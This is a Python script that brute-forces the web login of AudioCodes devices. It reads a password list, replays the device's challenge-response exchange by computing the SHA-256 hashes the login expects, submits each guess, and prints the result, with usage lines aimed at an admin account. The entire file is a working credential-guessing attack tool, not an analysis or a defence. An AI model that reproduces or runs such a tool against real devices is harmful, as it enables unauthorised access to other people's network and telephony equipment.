## first stage bruteforce login for audiocodes devices (function AsyncPostLoginSettings)
import sys
import time
import requests
import urllib
from bs4 import BeautifulSoup
from hashlib import sha256
from urllib.parse import urlencode
import warnings
warnings.filterwarnings("ignore")

def attack(url,username):

    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Accept': '*/*',
               'Accept-Language':'en-US,en;q=0.5',
               'Accept-Encoding':'gzip, deflate',
               'Content-Type': 'text/plain;charset=UTF-8',
               'Content-Length': '16',
               'Cookie': 'C3Sec=test; aclognameSec=; C6=ct'}
    myobj = urlencode({'t':'1','c0':'0','c1': username})

    for i in passwords:
        x = requests.post(url, data = myobj,headers=headers, verify=False)
        xmlsoup = BeautifulSoup(x.text, "lxml")
        result = str(xmlsoup.find("r"))
        a1 = sha256(i.encode('utf-8')).hexdigest()
        a2 = username + ':' + result + ':' + a1
        hash = sha256(a2.encode('utf-8')).hexdigest()

        myobj2 = urlencode({'t':'1', 's':'0', 'c0':'1','c1': hash})
        x2 = requests.post(url, data = myobj2,headers=headers, verify=False)
        xmlsoup2 = BeautifulSoup(x2.text, "lxml")
        result = str(xmlsoup2.find("reason"))
        print(result)
        time.sleep(20)


if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print('Usage: ./audiocodes_login.py <url> <username> <pswds>')
        print('Example: ./audiocodes_login.py https://x.x.x.x/UE/Login admin passwords.txt')

    else:
        if (sys.argv[2:]):
            c = open(sys.argv[3],"r")
            passwords = c.read().split("\n")
            attack(sys.argv[1], sys.argv[2])
